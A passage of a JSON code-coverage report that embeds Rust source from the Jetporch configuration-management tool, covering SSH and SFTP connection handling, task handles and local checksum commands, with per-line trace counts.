   return Err(format!(\"SSH agent authentication failed for user {}: {}\", self.username, x));\n                    }\n                };\n            }\n        }\n\n        if !(sess.authenticated()) { return Err(\"failed to authenticate\".to_string()); };\n      \n        // OS detection -- always run uname -a on first connect so we know the OS type, which will allow the command library and facts\n        // module to work correctly.\n\n        self.session = Some(sess);\n\n        let uname_result = self.run_command_low_level(\u0026String::from(\"uname -a\"));\n        match uname_result {\n            Ok((_rc,out)) =\u003e {\n                {\n                    match self.host.write().unwrap().set_os_info(\u0026out.clone()) {\n                        Ok(_x) =\u003e {},\n                        Err(_y) =\u003e return Err(format!(\"failed to set OS info\"))\n                    }\n                }\n                //match result2 { Ok(_) =\u003e {}, Err(s) =\u003e { return Err(s.to_string()) } }\n            },\n            Err((rc,out)) =\u003e return Err(format!(\"uname -a command failed: rc={}, out={}\", rc,out))\n        }\n\n\n        return Ok(());\n    }\n\n    fn run_command(\u0026self, response: \u0026Arc\u003cResponse\u003e, request: \u0026Arc\u003cTaskRequest\u003e, cmd: \u0026String, forward: Forward) -\u003e Result\u003cArc\u003cTaskResponse\u003e,Arc\u003cTaskResponse\u003e\u003e {\n        let result = match forward {   \n            Forward::Yes =\u003e match self.forward_agent {\n                false =\u003e self.run_command_low_level(cmd),\n                true  =\u003e self.run_command_with_ssh_a(cmd)\n            },\n            Forward::No =\u003e self.run_command_low_level(cmd)\n        };\n\n        match result {\n            Ok((rc,s)) =\u003e {\n                // note that non-zero return codes are \"ok\" to the connection plugin, handle elsewhere!\n                return Ok(response.command_ok(request, \u0026Arc::new(Some(CommandResult { cmd: cmd.clone(), out: s.clone(), rc: rc }))));\n            }, \n            Err((rc,s)) =\u003e {\n                return Err(response.command_failed(request, \u0026Arc::new(Some(CommandResult { cmd: cmd.clone(), out: s.clone(), rc: rc }))));\n            }\n        }\n    }\n\n    fn write_data(\u0026self, response: \u0026Arc\u003cResponse\u003e, request: \u0026Arc\u003cTaskRequest\u003e, data: \u0026String, remote_path: \u0026String) -\u003e Result\u003c(),Arc\u003cTaskResponse\u003e\u003e {\n\n        // SFTP writing does not allow root to overwrite files root does not own, and does not support sudo. \n        // as such this is a pretty low level write (as is copy_file) and logic around tempfiles and permissions is handled in remote.rs\n\n        // write_data writes a string and is really meant for small files like the template module. Large files should use copy_file instead.\n\n        let session = self.session.as_ref().expect(\"session not established\");\n        let sftp_result = session.sftp();\n        let sftp = match sftp_result {\n            Ok(x) =\u003e x,\n            Err(y) =\u003e { return Err(response.is_failed(request, \u0026format!(\"sftp connection failed: {y}\"))); }\n        };\n        let sftp_path = Path::new(\u0026remote_path);\n        let fh_result = sftp.create(sftp_path);\n        let mut fh = match fh_result {\n            Ok(x) =\u003e x,\n            Err(y) =\u003e { return Err(response.is_failed(request, \u0026format!(\"sftp open failed: {y}\"))) }\n        };\n        let bytes = data.as_bytes();\n        match fh.write_all(bytes) {\n            Ok(_x) =\u003e {},\n            Err(y) =\u003e { return Err(response.is_failed(request, \u0026format!(\"sftp write failed: {y}\"))); }\n        }\n\n        return Ok(());\n    }\n\n    fn copy_file(\u0026self, response: \u0026Arc\u003cResponse\u003e, request: \u0026Arc\u003cTaskRequest\u003e, src: \u0026Path, remote_path: \u0026String) -\u003e Result\u003c(), Arc\u003cTaskResponse\u003e\u003e {\n\n        // this is a streaming copy that should be fine with large files.\n\n        let src_open_result = File::open(src);\n        let src = match src_open_result {\n            Ok(x) =\u003e x,\n            Err(y) =\u003e { return Err(response.is_failed(request, \u0026format!(\"failed to open source file: {y}\"))); }\n        };\n\n        let session = self.session.as_ref().expect(\"session not established\");\n        let sftp_result = session.sftp();\n        let sftp = match sftp_result {\n            Ok(x) =\u003e x,\n            Err(y) =\u003e { return Err(response.is_failed(request, \u0026format!(\"sftp connection failed: {y}\"))); }\n        };\n        let sftp_path = Path::new(\u0026remote_path);\n        let fh_result = sftp.create(sftp_path);\n        let fh = match fh_result {\n            Ok(x) =\u003e x,\n            Err(y) =\u003e { return Err(response.is_failed(request, \u0026format!(\"sftp write failed (1): {y}\"))) }\n        };\n\n        let mut src2 = std::io::BufReader::with_capacity(1000000, src);\n        let mut fh2 = std::io::BufWriter::with_capacity(1000000, fh);\n\n        match io::copy(\u0026mut src2, \u0026mut fh2) {\n            Ok(_) =\u003e {},\n            Err(y) =\u003e { return Err(response.is_failed(request, \u0026format!(\"sftp copy failed (1): {y}\"))) }\n        };\n\n        return Ok(());\n    }\n}\n\nimpl SshConnection {\n\n    fn trim_newlines(\u0026self, s: \u0026mut String) {\n        if s.ends_with('\\n') {\n            s.pop();\n            if s.ends_with('\\r') {\n                s.pop();\n            }\n        }\n    }\n\n    fn run_command_low_level(\u0026self, cmd: \u0026String) -\u003e Result\u003c(i32,String),(i32,String)\u003e {\n        // FIXME: catch the rare possibility this unwrap fails and return a nice error?\n        let session = self.session.as_ref().unwrap();\n        let mut channel = match session.channel_session() {\n            Ok(x) =\u003e x,\n            Err(y) =\u003e { return Err((500, format!(\"channel session failed: {:?}\", y))); }\n        };\n        let actual_cmd = format!(\"LANG=C {} 2\u003e\u00261\", cmd);\n        match channel.exec(\u0026actual_cmd) { Ok(_x) =\u003e {}, Err(y) =\u003e { return Err((500,y.to_string())) } };\n        let mut s = String::new();\n        match channel.read_to_string(\u0026mut s) { Ok(_x) =\u003e {}, Err(y) =\u003e { return Err((500,y.to_string())) } };\n        // BOOKMARK: add sudo password prompt (configurable) support here (and below)\n        let _w = channel.wait_close();\n        let exit_status = match channel.exit_status() { Ok(x) =\u003e x, Err(y) =\u003e { return Err((500,y.to_string())) } };\n        self.trim_newlines(\u0026mut s);\n        return Ok((exit_status, s.clone()));\n    }\n\n    fn run_command_with_ssh_a(\u0026self, cmd: \u0026String) -\u003e Result\u003c(i32,String),(i32,String)\u003e {\n        // this is annoying but libssh2 agent support is not really working, so if we need to SSH -A we need to invoke\n        // SSHd directly, which we need to for example with git clones. we will likely use this again\n        // for fanout support.\n\n        let mut base = Command::new(\"ssh\");\n        let hostname = \u0026self.host.read().unwrap().name;\n        let port = format!(\"{}\", self.port);\n        let cmd2 = format!(\"LANG=C {} 2\u003e\u00261\", cmd);\n        let command = base.arg(hostname).arg(\"-p\").arg(port).arg(\"-l\").arg(self.username.clone()).arg(\"-A\").arg(cmd2);\n        match command.output() {\n            Ok(x) =\u003e {\n                match x.status.code() {\n                    Some(rc) =\u003e {\n                        let mut out = convert_out(\u0026x.stdout,\u0026x.stderr);\n                        self.trim_newlines(\u0026mut out);\n                        return Ok((rc, out.clone()))\n                    },\n                    None =\u003e {\n                        return Ok((418, String::from(\"\")))\n                    }\n                }\n            },\n            Err(_x) =\u003e {\n                return Err((404, String::from(\"\")))\n            }\n        };\n    }\n\n}\n","traces":[{"line":50,"address":[],"length":0,"stats":{"Line":0}},{"line":53,"address":[],"length":0,"stats":{"Line":0}},{"line":54,"address":[],"length":0,"stats":{"Line":0}},{"line":63,"address":[],"length":0,"stats":{"Line":0}},{"line":64,"address":[],"length":0,"stats":{"Line":0}},{"line":67,"address":[],"length":0,"stats":{"Line":0}},{"line":68,"address":[],"length":0,"stats":{"Line":0}},{"line":69,"address":[],"length":0,"stats":{"Line":0}},{"line":70,"address":[],"length":0,"stats":{"Line":0}},{"line":73,"address":[],"length":0,"stats":{"Line":0}},{"line":74,"address":[],"length":0,"stats":{"Line":0}},{"line":80,"address":[],"length":0,"stats":{"Line":0}},{"line":81,"address":[],"length":0,"stats":{"Line":0}},{"line":82,"address":[],"length":0,"stats":{"Line":0}},{"line":83,"address":[],"length":0,"stats":{"Line":0}},{"line":89,"address":[],"length":0,"stats":{"Line":0}},{"line":90,"address":[],"length":0,"stats":{"Line":0}},{"line":93,"address":[],"length":0,"stats":{"Line":0}},{"line":94,"address":[],"length":0,"stats":{"Line":0}},{"line":98,"address":[],"length":0,"stats":{"Line":0}},{"line":99,"address":[],"length":0,"stats":{"Line":0}},{"line":101,"address":[],"length":0,"stats":{"Line":0}},{"line":102,"address":[],"length":0,"stats":{"Line":0}},{"line":103,"address":[],"length":0,"stats":{"Line":0}},{"line":104,"address":[],"length":0,"stats":{"Line":0}},{"line":106,"address":[],"length":0,"stats":{"Line":0}},{"line":125,"address":[],"length":0,"stats":{"Line":0}},{"line":126,"address":[],"length":0,"stats":{"Line":0}},{"line":132,"address":[],"length":0,"stats":{"Line":0}},{"line":135,"address":[],"length":0,"stats":{"Line":0}},{"line":138,"address":[],"length":0,"stats":{"Line":0}},{"line":140,"address":[],"length":0,"stats":{"Line":0}},{"line":142,"address":[],"length":0,"stats":{"Line":0}},{"line":146,"address":[],"length":0,"stats":{"Line":0}},{"line":147,"address":[],"length":0,"stats":{"Line":0}},{"line":148,"address":[],"length":0,"stats":{"Line":0}},{"line":149,"address":[],"length":0,"stats":{"Line":0}},{"line":150,"address":[],"length":0,"stats":{"Line":0}},{"line":151,"address":[],"length":0,"stats":{"Line":0}},{"line":152,"address":[],"length":0,"stats":{"Line":0}},{"line":157,"address":[],"length":0,"stats":{"Line":0}},{"line":158,"address":[],"length":0,"stats":{"Line":0}},{"line":169,"address":[],"length":0,"stats":{"Line":0}},{"line":170,"address":[],"length":0,"stats":{"Line":0}},{"line":171,"address":[],"length":0,"stats":{"Line":0}},{"line":173,"address":[],"length":0,"stats":{"Line":0}},{"line":176,"address":[],"length":0,"stats":{"Line":0}},{"line":177,"address":[],"length":0,"stats":{"Line":0}},{"line":178,"address":[],"length":0,"stats":{"Line":0}},{"line":181,"address":[],"length":0,"stats":{"Line":0}},{"line":182,"address":[],"length":0,"stats":{"Line":0}},{"line":185,"address":[],"length":0,"stats":{"Line":0}},{"line":186,"address":[],"length":0,"stats":{"Line":0}},{"line":187,"address":[],"length":0,"stats":{"Line":0}},{"line":189,"address":[],"length":0,"stats":{"Line":0}},{"line":190,"address":[],"length":0,"stats":{"Line":0}},{"line":191,"address":[],"length":0,"stats":{"Line":0}},{"line":192,"address":[],"length":0,"stats":{"Line":0}},{"line":193,"address":[],"length":0,"stats":{"Line":0}},{"line":198,"address":[],"length":0,"stats":{"Line":0}},{"line":200,"address":[],"length":0,"stats":{"Line":0}},{"line":201,"address":[],"length":0,"stats":{"Line":0}},{"line":202,"address":[],"length":0,"stats":{"Line":0}},{"line":203,"address":[],"length":0,"stats":{"Line":0}},{"line":205,"address":[],"length":0,"stats":{"Line":0}},{"line":206,"address":[],"length":0,"stats":{"Line":0}},{"line":207,"address":[],"length":0,"stats":{"Line":0}},{"line":208,"address":[],"length":0,"stats":{"Line":0}},{"line":213,"address":[],"length":0,"stats":{"Line":0}},{"line":214,"address":[],"length":0,"stats":{"Line":0}},{"line":216,"address":[],"length":0,"stats":{"Line":0}},{"line":217,"address":[],"length":0,"stats":{"Line":0}},{"line":218,"address":[],"length":0,"stats":{"Line":0}},{"line":219,"address":[],"length":0,"stats":{"Line":0}},{"line":220,"address":[],"length":0,"stats":{"Line":0}},{"line":225,"address":[],"length":0,"stats":{"Line":0}},{"line":226,"address":[],"length":0,"stats":{"Line":0}},{"line":227,"address":[],"length":0,"stats":{"Line":0}},{"line":228,"address":[],"length":0,"stats":{"Line":0}},{"line":231,"address":[],"length":0,"stats":{"Line":0}},{"line":232,"address":[],"length":0,"stats":{"Line":0}},{"line":233,"address":[],"length":0,"stats":{"Line":0}},{"line":235,"address":[],"length":0,"stats":{"Line":0}},{"line":238,"address":[],"length":0,"stats":{"Line":0}},{"line":239,"address":[],"length":0,"stats":{"Line":0}},{"line":241,"address":[],"length":0,"stats":{"Line":0}},{"line":242,"address":[],"length":0,"stats":{"Line":0}},{"line":243,"address":[],"length":0,"stats":{"Line":0}},{"line":247,"address":[],"length":0,"stats":{"Line":0}},{"line":250,"address":[],"length":0,"stats":{"Line":0}},{"line":251,"address":[],"length":0,"stats":{"Line":0}},{"line":255,"address":[],"length":0,"stats":{"Line":0}},{"line":256,"address":[],"length":0,"stats":{"Line":0}},{"line":257,"address":[],"length":0,"stats":{"Line":0}},{"line":258,"address":[],"length":0,"stats":{"Line":0}},{"line":264,"address":[],"length":0,"stats":{"Line":0}},{"line":269,"address":[],"length":0,"stats":{"Line":0}},{"line":271,"address":[],"length":0,"stats":{"Line":0}},{"line":272,"address":[],"length":0,"stats":{"Line":0}},{"line":273,"address":[],"length":0,"stats":{"Line":0}},{"line":275,"address":[],"length":0,"stats":{"Line":0}},{"line":276,"address":[],"length":0,"stats":{"Line":0}},{"line":277,"address":[],"length":0,"stats":{"Line":0}},{"line":282,"address":[],"length":0,"stats":{"Line":0}},{"line":286,"address":[],"length":0,"stats":{"Line":0}},{"line":289,"address":[],"length":0,"stats":{"Line":0}},{"line":290,"address":[],"length":0,"stats":{"Line":0}},{"line":291,"address":[],"length":0,"stats":{"Line":0}},{"line":292,"address":[],"length":0,"stats":{"Line":0}},{"line":293,"address":[],"length":0,"stats":{"Line":0}},{"line":295,"address":[],"length":0,"stats":{"Line":0}},{"line":298,"address":[],"length":0,"stats":{"Line":0}},{"line":299,"address":[],"length":0,"stats":{"Line":0}},{"line":301,"address":[],"length":0,"stats":{"Line":0}},{"line":303,"address":[],"length":0,"stats":{"Line":0}},{"line":304,"address":[],"length":0,"stats":{"Line":0}},{"line":309,"address":[],"length":0,"stats":{"Line":0}},{"line":316,"address":[],"length":0,"stats":{"Line":0}},{"line":317,"address":[],"length":0,"stats":{"Line":0}},{"line":318,"address":[],"length":0,"stats":{"Line":0}},{"line":319,"address":[],"length":0,"stats":{"Line":0}},{"line":320,"address":[],"length":0,"stats":{"Line":0}},{"line":322,"address":[],"length":0,"stats":{"Line":0}},{"line":323,"address":[],"length":0,"stats":{"Line":0}},{"line":324,"address":[],"length":0,"stats":{"Line":0}},{"line":325,"address":[],"length":0,"stats":{"Line":0}},{"line":326,"address":[],"length":0,"stats":{"Line":0}},{"line":328,"address":[],"length":0,"stats":{"Line":0}},{"line":329,"address":[],"length":0,"stats":{"Line":0}},{"line":330,"address":[],"length":0,"stats":{"Line":0}},{"line":331,"address":[],"length":0,"stats":{"Line":0}},{"line":334,"address":[],"length":0,"stats":{"Line":0}},{"line":337,"address":[],"length":0,"stats":{"Line":0}},{"line":341,"address":[],"length":0,"stats":{"Line":0}},{"line":342,"address":[],"length":0,"stats":{"Line":0}},{"line":343,"address":[],"length":0,"stats":{"Line":0}},{"line":344,"address":[],"length":0,"stats":{"Line":0}},{"line":347,"address":[],"length":0,"stats":{"Line":0}},{"line":348,"address":[],"length":0,"stats":{"Line":0}},{"line":349,"address":[],"length":0,"stats":{"Line":0}},{"line":350,"address":[],"length":0,"stats":{"Line":0}},{"line":351,"address":[],"length":0,"stats":{"Line":0}},{"line":353,"address":[],"length":0,"stats":{"Line":0}},{"line":354,"address":[],"length":0,"stats":{"Line":0}},{"line":355,"address":[],"length":0,"stats":{"Line":0}},{"line":356,"address":[],"length":0,"stats":{"Line":0}},{"line":357,"address":[],"length":0,"stats":{"Line":0}},{"line":360,"address":[],"length":0,"stats":{"Line":0}},{"line":361,"address":[],"length":0,"stats":{"Line":0}},{"line":363,"address":[],"length":0,"stats":{"Line":0}},{"line":364,"address":[],"length":0,"stats":{"Line":0}},{"line":365,"address":[],"length":0,"stats":{"Line":0}},{"line":368,"address":[],"length":0,"stats":{"Line":0}},{"line":374,"address":[],"length":0,"stats":{"Line":0}},{"line":375,"address":[],"length":0,"stats":{"Line":0}},{"line":376,"address":[],"length":0,"stats":{"Line":0}},{"line":377,"address":[],"length":0,"stats":{"Line":0}},{"line":378,"address":[],"length":0,"stats":{"Line":0}},{"line":383,"address":[],"length":0,"stats":{"Line":0}},{"line":385,"address":[],"length":0,"stats":{"Line":0}},{"line":386,"address":[],"length":0,"stats":{"Line":0}},{"line":387,"address":[],"length":0,"stats":{"Line":0}},{"line":388,"address":[],"length":0,"stats":{"Line":0}},{"line":390,"address":[],"length":0,"stats":{"Line":0}},{"line":391,"address":[],"length":0,"stats":{"Line":0}},{"line":392,"address":[],"length":0,"stats":{"Line":0}},{"line":393,"address":[],"length":0,"stats":{"Line":0}},{"line":395,"address":[],"length":0,"stats":{"Line":0}},{"line":396,"address":[],"length":0,"stats":{"Line":0}},{"line":397,"address":[],"length":0,"stats":{"Line":0}},{"line":398,"address":[],"length":0,"stats":{"Line":0}},{"line":401,"address":[],"length":0,"stats":{"Line":0}},{"line":406,"address":[],"length":0,"stats":{"Line":0}},{"line":407,"address":[],"length":0,"stats":{"Line":0}},{"line":408,"address":[],"length":0,"stats":{"Line":0}},{"line":409,"address":[],"length":0,"stats":{"Line":0}},{"line":410,"address":[],"length":0,"stats":{"Line":0}},{"line":411,"address":[],"length":0,"stats":{"Line":0}},{"line":412,"address":[],"length":0,"stats":{"Line":0}},{"line":413,"address":[],"length":0,"stats":{"Line":0}},{"line":414,"address":[],"length":0,"stats":{"Line":0}},{"line":415,"address":[],"length":0,"stats":{"Line":0}},{"line":416,"address":[],"length":0,"stats":{"Line":0}},{"line":417,"address":[],"length":0,"stats":{"Line":0}},{"line":420,"address":[],"length":0,"stats":{"Line":0}},{"line":424,"address":[],"length":0,"stats":{"Line":0}},{"line":425,"address":[],"length":0,"stats":{"Line":0}}],"covered":0,"coverable":187},{"path":["/","Users","wings","projects","jetpack","src","handle","handle.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse std::sync::{Arc,Mutex,RwLock};\nuse crate::connection::connection::Connection;\nuse crate::tasks::request::TaskRequest;\nuse crate::inventory::hosts::Host;\nuse crate::playbooks::traversal::RunState;\n\nuse crate::handle::local::Local;\nuse crate::handle::remote::Remote;\nuse crate::handle::template::Template;\nuse crate::handle::response::Response;\n\n// task handles are given to modules to give them shortcuts to work with the jet system\n// actual functionality is mostly provided via TaskRequest/TaskResponse and such, the handles\n// are mostly module authors don't need to think about how things work as much.  This is\n// especially true for the finite state machine that executes tasks.\n\n// whether commands should treat non-zero returns as errors\n#[derive(Eq,Hash,PartialEq,Clone,Copy,Debug)]\npub enum CheckRc {\n    Checked,\n    Unchecked\n}\n\npub struct TaskHandle {\n    pub run_state: Arc\u003cRunState\u003e, \n    _connection: Arc\u003cMutex\u003cdyn Connection\u003e\u003e,\n    pub host: Arc\u003cRwLock\u003cHost\u003e\u003e,\n    pub local: Arc\u003cLocal\u003e,\n    pub remote: Arc\u003cRemote\u003e,\n    pub response: Arc\u003cResponse\u003e,\n    pub template: Arc\u003cTemplate\u003e,\n}\n\nimpl TaskHandle {\n\n    pub fn new(run_state_handle: Arc\u003cRunState\u003e, connection_handle: Arc\u003cMutex\u003cdyn Connection\u003e\u003e, host_handle: Arc\u003cRwLock\u003cHost\u003e\u003e) -\u003e Self {\n\n        // since we can't really have back-references (thanks Rust?) we pass to each namespace what we need of the others\n        // thankfully, no circular references seem to be required :)\n\n        // response contains namespaced shortcuts for returning results from module calls\n        let response = Arc::new(Response::new(\n            Arc::clone(\u0026run_state_handle), \n            Arc::clone(\u0026host_handle)\n        ));\n\n        // template contains various functions around templating strings, and is most commonly seen in processing module\n        // input parameters as well as directly used in modules like template. It's also used in a few places inside\n        // the engine itself.\n        let template = Arc::new(Template::new(\n            Arc::clone(\u0026run_state_handle), \n            Arc::clone(\u0026host_handle),\n            Arc::clone(\u0026response)\n        ));\n\n        // remote contains code for interacting with the host being configured.  The host could actually be 'localhost', but it's usually\n        // a machine different from the control machine.  this could be called \"configuration_target\" instead but that would be more typing\n        let remote = Arc::new(Remote::new(\n            Arc::clone(\u0026run_state_handle), \n            Arc::clone(\u0026connection_handle), \n            Arc::clone(\u0026host_handle),\n            Arc::clone(\u0026template),\n            Arc::clone(\u0026response)\n        ));\n\n        // local contains code that is related to looking at the control machine.  Even in local configuration modes, functions here are\n        // not used to configure the actual system, those would be from remote. this could be thought of as 'control-machine-side-module-support'.\n\n        let local = Arc::new(Local::new(\n            Arc::clone(\u0026run_state_handle), \n            Arc::clone(\u0026host_handle),\n            Arc::clone(\u0026response)\n        ));\n\n        // the handle itself allows access to all of the above namespaces and also has a reference to the host being configured.\n        // run_state itself is a bit of a pseudo-global and contains quite a few more parameters, see playbook/traversal.rs for\n        // what it contains. \n\n        let s = Self {\n            run_state: Arc::clone(\u0026run_state_handle),\n            _connection: Arc::clone(\u0026connection_handle),\n            host: Arc::clone(\u0026host_handle),\n            remote: Arc::clone(\u0026remote),\n            local: Arc::clone(\u0026local),\n            response: Arc::clone(\u0026response),\n            template: Arc::clone(\u0026template),\n        };\n        s\n    }\n\n    pub fn debug(\u0026self, _request: \u0026Arc\u003cTaskRequest\u003e, message: \u0026String) {\n        self.run_state.visitor.read().unwrap().debug_host(\u0026self.host, message);\n    }\n\n}","traces":[{"line":52,"address":[],"length":0,"stats":{"Line":0}},{"line":58,"address":[],"length":0,"stats":{"Line":0}},{"line":59,"address":[],"length":0,"stats":{"Line":0}},{"line":60,"address":[],"length":0,"stats":{"Line":0}},{"line":66,"address":[],"length":0,"stats":{"Line":0}},{"line":67,"address":[],"length":0,"stats":{"Line":0}},{"line":68,"address":[],"length":0,"stats":{"Line":0}},{"line":69,"address":[],"length":0,"stats":{"Line":0}},{"line":74,"address":[],"length":0,"stats":{"Line":0}},{"line":75,"address":[],"length":0,"stats":{"Line":0}},{"line":76,"address":[],"length":0,"stats":{"Line":0}},{"line":77,"address":[],"length":0,"stats":{"Line":0}},{"line":78,"address":[],"length":0,"stats":{"Line":0}},{"line":79,"address":[],"length":0,"stats":{"Line":0}},{"line":85,"address":[],"length":0,"stats":{"Line":0}},{"line":86,"address":[],"length":0,"stats":{"Line":0}},{"line":87,"address":[],"length":0,"stats":{"Line":0}},{"line":88,"address":[],"length":0,"stats":{"Line":0}},{"line":96,"address":[],"length":0,"stats":{"Line":0}},{"line":97,"address":[],"length":0,"stats":{"Line":0}},{"line":98,"address":[],"length":0,"stats":{"Line":0}},{"line":99,"address":[],"length":0,"stats":{"Line":0}},{"line":100,"address":[],"length":0,"stats":{"Line":0}},{"line":101,"address":[],"length":0,"stats":{"Line":0}},{"line":102,"address":[],"length":0,"stats":{"Line":0}},{"line":104,"address":[],"length":0,"stats":{"Line":0}},{"line":107,"address":[],"length":0,"stats":{"Line":0}},{"line":108,"address":[],"length":0,"stats":{"Line":0}}],"covered":0,"coverable":28},{"path":["/","Users","wings","projects","jetpack","src","handle","local.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse std::sync::{Arc,RwLock};\nuse std::path::Path;\nuse crate::connection::command::cmd_info;\nuse crate::tasks::{TaskRequest,TaskRequestType,TaskResponse};\nuse crate::inventory::hosts::Host;\nuse crate::playbooks::traversal::RunState;\nuse crate::tasks::cmd_library::screen_general_input_loose;\nuse crate::handle::handle::CheckRc;\nuse crate::handle::response::Response;\nuse crate::connection::command::Forward;\n\n// local contains code that always executes on the control machine, whether in SSH mode or 'local' execution\n// mode. The code that refers to the machine being configured is always in 'remote.rs', whether in SSH\n// mode or using a local connection also!\n\npub struct Local {\n    run_state: Arc\u003cRunState\u003e, \n    _host: Arc\u003cRwLock\u003cHost\u003e\u003e, \n    response: Arc\u003cResponse\u003e,\n}\n\nimpl Local {\n\n    pub fn new(run_state_handle: Arc\u003cRunState\u003e, host_handle: Arc\u003cRwLock\u003cHost\u003e\u003e, response:Arc\u003cResponse\u003e) -\u003e Self {\n        Self {\n            run_state: run_state_handle,\n            _host: host_handle,\n            response: response\n        }\n    }\n\n    pub fn get_localhost(\u0026self) -\u003e Arc\u003cRwLock\u003cHost\u003e\u003e {\n        let inventory = self.run_state.inventory.read().unwrap();\n        return inventory.get_host(\u0026String::from(\"localhost\"));\n    }\n\n    fn unwrap_string_result(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, str_result: \u0026Result\u003cString,String\u003e) -\u003e Result\u003cString, Arc\u003cTaskResponse\u003e\u003e {\n        return match str_result {\n            Ok(x) =\u003e Ok(x.clone()),\n            Err(y) =\u003e Err(self.response.is_failed(request, \u0026y.clone()))\n        };\n    }\n\n    // runs a shell command.  These can only be executed in the query stage as we don't want anything done to actually configure\n    // a machine in local.rs. \n\n    fn run(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, cmd: \u0026String, check_rc: CheckRc) -\u003e Result\u003cArc\u003cTaskResponse\u003e,Arc\u003cTaskResponse\u003e\u003e {\n        \n        assert!(request.request_type == TaskRequestType::Query, \"local commands can only be run in query stage (was: {:?})\", request.request_type);\n        // apply basic screening of the entire shell command, more filtering should already be done by cmd_library\n        match screen_general_input_loose(\u0026cmd) {\n            Ok(_x) =\u003e {},\n            Err(y) =\u003e return Err(self.response.is_failed(request, \u0026y.clone()))\n        }\n        let ctx = \u0026self.run_state.context;\n        let local_result = self.run_state.connection_factory.read().unwrap().get_local_connection(\u0026ctx);\n        let local_conn = match local_result {\n            Ok(x) =\u003e x,\n            Err(y) =\u003e { return Err(self.response.is_failed(request, \u0026y.clone())) }\n        };\n        let result = local_conn.lock().unwrap().run_command(\u0026self.response, request, cmd, Forward::No);\n\n        if check_rc == CheckRc::Checked {\n            if result.is_ok() {\n                let ok_result = result.as_ref().unwrap();\n                let cmd_result = ok_result.command_result.as_ref().as_ref().unwrap();\n                if cmd_result.rc != 0 {\n                    return Err(self.response.command_failed(request, \u0026Arc::new(Some(cmd_result.clone()))));\n                }\n            }\n        }\n        return result;\n    }\n\n    pub fn read_file(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, path: \u0026Path) -\u003e Result\u003cString, Arc\u003cTaskResponse\u003e\u003e {\n        return match crate::util::io::read_local_file(path) {\n            Ok(s) =\u003e Ok(s),\n            Err(x) =\u003e Err(self.response.is_failed(request, \u0026x.clone()))\n        };\n    }\n\n    fn internal_sha512(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, path: \u0026String) -\u003e Result\u003cString,Arc\u003cTaskResponse\u003e\u003e {\n        let localhost = self.get_localhost();\n        let os_type = localhost.read().unwrap().os_type.expect(\"unable to detect host OS type\");\n        let get_cmd_result = crate::tasks::cmd_library::get_sha512_command(os_type, path);\n        let cmd = self.unwrap_string_result(\u0026request, \u0026get_cmd_result)?;\n        let result = self.run(request, \u0026cmd, CheckRc::Unchecked)?;\n        let (rc, out) = cmd_info(\u0026result);\n        match rc {\n            // we can all unwrap because all possible string lists will have at least 1 element\n            0 =\u003e {\n                let value = out.split_whitespace().nth(0).unwrap().to_string();\n                return Ok(value);\n            },\n            127 =\u003e {\n                // file not found\n                return Ok(String::from(\"\"))\n            },\n            _ =\u003e {\n                return Err(self.response.is_failed(request, \u0026format!(\"checksum failed: {}. {}\", path, out)));\n            }\n        };\n    }\n\n    pub fn get_sha512(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, path: \u0026Path, use_cache: bool) -\u003e Result\u003cString,Arc\u003cTaskResponse\u003e\u003e {\n        let path2 = format!(\"{}\", path.display());\n        let localhost = self.get_localhost();\n        if use_cache {\n            let ctx = self.run_state.context.read().unwrap();\n            let task_id = ctx.get_task_count();\n            let mut localhost2 = localhost.write().unwrap();\n            let cached = localhost2.get_checksum_cache(task_id, \u0026path2);\n            if cached.is_some() {\n                return Ok(cached.unwrap());\n            }\n        }\n\n        // this is a little weird.\n        let value = self.internal_sha512(request, \u0026path2)?;\n        if use_cache {\n            let mut localhost2 = localhost.write().unwrap();\n            localhost2.set_checksum_cache(\u0026path2, \u0026value);\n        }\n        return Ok(value);\n    }\n\n\n}","traces":[{"line":40,"address":[],"length":0,"stats":{"Line":0}},{"line":48,"address":[],"length":0,"stats":{"Line":0}},{"line":49,"address":[],"length":0,"stats":{"Line":0}},{"line":50,"address":[],"length":0,"stats":{"Line":0}},{"line":53,"address":[],"length":0,"stats":{"Line":0}},{"line":54,"address":[],"length":0,"stats":{"Line":0}},{"line":55,"address":[],"length":0,"stats":{"Line":0}},{"line":56,"address":[],"length":0,"stats":{"Line":0}},{"line":63,"address":[],"length":0,"stats":{"Line":0}},{"line":65,"address":[],"length":0,"stats":{"Line":0}},{"line":67,"address":[],"length":0,"stats":{"Line":0}},{"line":68,"address":[],"length":0,"stats":{"Line":0}},{"line":69,"address":[],"length":0,"stats":{"Line":0}},{"line":71,"address":[],"length":0,"stats":{"Line":0}},{"line":72,"address":[],"length":0,"stats":{"Line":0}},{"line":73,"address":[],"length":0,"stats":{"Line":0}},{"line":74,"address":[],"length":0,"stats":{"Line":0}},{"line":75,"address":[],"length":0,"stats":{"Line":0}},{"line":77,"address":[],"length":0,"stats":{"Line":0}},{"line":79,"address":[],"length":0,"stats":{"Line":0}},{"line":80,"address":[],"length":0,"stats":{"Line":0}},{"line":81,"address":[],"length":0,"stats":{"Line":0}},{"line":82,"address":[],"length":0,"stats":{"Line":0}},{"line":83,"address":[],"length":0,"stats":{"Line":0}},{"line":84,"address":[],"length":0